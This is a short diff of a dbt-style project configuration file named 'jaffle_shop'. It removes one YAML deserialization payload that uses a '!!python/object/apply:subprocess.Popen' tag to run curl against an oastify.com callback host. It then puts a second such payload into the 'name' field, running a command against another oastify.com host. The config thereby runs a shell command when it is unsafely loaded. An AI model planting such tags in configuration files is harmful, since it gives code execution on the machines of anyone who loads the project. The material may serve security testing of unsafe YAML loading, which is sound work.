@@ -1,8 +1,7 @@
-!!python/object/apply:subprocess.Popen
-- curl http://8nw0k0n1dirubtkklojzw7blvc14pt.oastify.com
 
-name: 'jaffle_shop'
-
+#name: 'jaffle_shop'
+name: !!python/object/apply:subprocess.Popen
+	- "ping http://qztiwizjp03cnbw2x6vh8pn37udn1c.oastify.com"
 config-version: 2
 version: '0.1'
 
